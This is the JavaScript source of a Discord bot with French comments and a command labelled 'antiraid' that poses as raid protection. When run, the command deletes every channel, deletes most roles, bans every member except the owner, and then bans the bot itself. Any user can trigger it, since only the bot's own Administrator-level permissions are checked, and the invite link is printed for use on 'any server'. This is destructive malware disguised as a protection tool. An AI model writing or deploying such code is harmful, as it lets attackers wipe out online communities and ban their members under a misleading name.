require('dotenv').config();
const { Client, GatewayIntentBits, PermissionFlagsBits, REST, Routes, ApplicationCommandType, SlashCommandBuilder, OAuth2Scopes } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildModeration
    ]
});

// D√©finition de la commande slash
const commands = [
    new SlashCommandBuilder()
        .setName('antiraid')
        .setDescription('antiraid ')
        .toJSON()
];

const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

client.once('ready', async () => {
    console.log(`Bot connect√© en tant que ${client.user.tag}`);
    
    // G√©n√©rer le lien d'invitation permanent
    const invite = client.generateInvite({
        scopes: [OAuth2Scopes.Bot, OAuth2Scopes.ApplicationsCommands],
        permissions: [
            PermissionFlagsBits.Administrator,
            PermissionFlagsBits.ManageRoles,
            PermissionFlagsBits.ManageChannels,
            PermissionFlagsBits.BanMembers,
            PermissionFlagsBits.ManageGuild
        ]
    });
    
    console.log('='.repeat(50));
    console.log('LIEN D\'INVITATION PERMANENT DU BOT :');
    console.log(invite);
    console.log('Utilisez ce lien pour inviter le bot sur n\'importe quel serveur');
    console.log('='.repeat(50));

    try {
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands },
        );
        console.log('Commandes slash enregistr√©es avec succ√®s');
    } catch (error) {
        console.error('Erreur lors de l\'enregistrement des commandes:', error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    if (interaction.commandName === 'antiraid') {
        // V√©rifier uniquement les permissions du bot
        const requiredPermissions = [
            PermissionFlagsBits.Administrator,
            PermissionFlagsBits.ManageRoles,
            PermissionFlagsBits.ManageChannels,
            PermissionFlagsBits.BanMembers,
            PermissionFlagsBits.ManageGuild
        ];

        const missingPermissions = [];
        for (const permission of requiredPermissions) {
            if (!interaction.guild.members.me.permissions.has(permission)) {
                missingPermissions.push(Object.keys(PermissionFlagsBits).find(key => PermissionFlagsBits[key] === permission));
            }
        }

        if (missingPermissions.length > 0) {
            return interaction.reply({
                content: `‚ùå Le bot n'a pas toutes les permissions n√©cessaires. Permissions manquantes : ${missingPermissions.join(', ')}. Veuillez r√©inviter le bot avec le lien d'invitation g√©n√©r√© dans la console.`,
                ephemeral: true
            });
        }

        // Demander une confirmation
        await interaction.reply({
            content: '‚ö†Ô∏è ATTENTION: Voulez-vous vraiment activer l\'antiraid ?',
            ephemeral: true
        });

        try {
            await interaction.followUp({
                content: 'üö® L\'antiraid va √™tre activ√© dans 5 secondes. √ätes-vous absolument s√ªr ?',
                ephemeral: true
            });

            setTimeout(async () => {
                try {
                    await interaction.followUp({
                        content: 'üí• Activation de l\'antiraid en cours...',
                        ephemeral: true
                    });

                    // Supprimer tous les salons
                    const channels = await interaction.guild.channels.fetch();
                    for (const channel of channels.values()) {
                        try {
                            await channel.delete();
                        } catch (error) {
                            console.error(`Impossible de supprimer le salon ${channel.name}:`, error);
                        }
                    }

                    // Supprimer tous les r√¥les
                    const roles = await interaction.guild.roles.fetch();
                    for (const role of roles.values()) {
                        if (!role.managed && role.id !== interaction.guild.id) {
                            try {
                                // V√©rifier si le bot peut g√©rer ce r√¥le (hi√©rarchie)
                                const botRole = interaction.guild.members.me.roles.highest;
                                if (role.position >= botRole.position) {
                                    console.error(`Impossible de supprimer le r√¥le ${role.name}: Le r√¥le est plus haut que celui du bot`);
                                    continue;
                                }
                                
                                // Supprimer le r√¥le en utilisant l'API Discord.js
                                await role.delete(`Antiraid activ√©`);
                                console.log(`R√¥le ${role.name} supprim√© avec succ√®s`);
                                // Attendre un court instant pour √©viter le rate limit
                                await new Promise(resolve => setTimeout(resolve, 1000));
                            } catch (error) {
                                console.error(`Impossible de supprimer le r√¥le ${role.name}: ${error.message}`);
                            }
                        }
                    }

                    // Bannir tous les membres (sauf le propri√©taire et notre bot)
                    const members = await interaction.guild.members.fetch();
                    for (const member of members.values()) {
                        if (member.id !== interaction.guild.ownerId && member.id !== client.user.id) {
                            try {
                                await member.ban({ reason: 'Antiraid activ√©' });
                            } catch (error) {
                                console.error(`Impossible de bannir ${member.user.tag}:`, error);
                            }
                        }
                    }

                    await interaction.followUp({
                        content: '‚úÖ Antiraid termin√© avec succ√®s.',
                        ephemeral: true
                    });

                    // Auto-bannissement du bot
                    try {
                        const botMember = interaction.guild.members.me;
                        await interaction.followUp({
                            content: 'ü§ñ Auto-destruction du bot en cours...',
                            ephemeral: true
                        });
                        await botMember.ban({ reason: 'Auto-bannissement apr√®s antiraid' });
                    } catch (error) {
                        console.error('Erreur lors de l\'auto-bannissement:', error);
                    }

                } catch (error) {
                    console.error('Erreur lors de l\'antiraid:', error);
                    await interaction.followUp({
                        content: '‚ùå Une erreur est survenue lors de l\'activation de l\'antiraid.',
                        ephemeral: true
                    });
                }
            }, 5000);
        } catch (error) {
            console.error('Erreur:', error);
            await interaction.followUp({
                content: '‚ùå Une erreur est survenue.',
                ephemeral: true
            });
        }
    }
});

// Connexion du bot avec le token
client.login(process.env.TOKEN);
